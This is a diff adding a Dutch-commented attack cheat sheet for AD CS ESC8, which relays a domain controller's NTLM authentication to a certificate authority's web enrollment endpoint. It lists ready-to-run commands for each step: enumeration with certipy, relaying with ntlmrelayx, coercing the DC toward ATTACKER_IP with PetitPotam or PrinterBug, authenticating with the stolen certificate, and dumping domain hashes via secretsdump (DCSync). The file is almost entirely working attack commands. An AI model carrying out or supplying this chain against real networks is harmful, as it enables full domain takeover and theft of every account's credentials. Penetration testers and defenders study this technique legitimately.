@@ -1,0 +1,26 @@
+# AD CS ESC8 - NTLM Relay to AD CS HTTP Endpoints
+# CA heeft HTTP enrollment endpoint (Web Enrollment / CES) actief
+# NTLM authenticatie zonder EPA → relay machine account naar certificaat
+# Stap 1: Check of HTTP enrollment endpoints actief zijn
+# Web Enrollment: http://ca-server/certsrv/
+# CES: http://ca-server/domain-CA_CES_Kerberos/service.svc
+certipy find -u user@domain.local -p Password123! -dc-ip DC_IP
+# Zoek in output naar: "Web Enrollment: Enabled" of "Certificate Enrollment Service: Enabled"
+# Stap 2: Start ntlmrelayx richting de CA
+# Voor DC machine account (DomainController$):
+impacket-ntlmrelayx -t http://ca-server/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
+# Of met Certipy relay:
+certipy relay -ca ca-server -template DomainController
+# Stap 3: Trigger NTLM auth van DC (via PetitPotam, PrinterBug, etc.)
+python3 PetitPotam.py -u user -p Password123! -d domain.local ATTACKER_IP dc01.domain.local
+# Of via PrinterBug:
+python3 dementor.py -u user -p Password123! -d domain.local ATTACKER_IP dc01.domain.local
+# Stap 4: ntlmrelayx vangt de auth en vraagt certificaat aan
+# Output: base64 certificaat of .pfx bestand
+# Stap 5: Authenticate met het DC certificaat
+certipy auth -pfx dc01.pfx -dc-ip DC_IP
+# Dit geeft de NT hash van het DC machine account → DCSync
+impacket-secretsdump -hashes :NTHASH domain.local/dc01\$@dc01.domain.local
+# Tip: ESC8 werkt het beste met machine accounts (DomainController template)
+# Tip: Check of EPA (Extended Protection for Authentication) uit staat
+# Tip: Combineer met PetitPotam (MS-EFSRPC) voor unauthenticated trigger
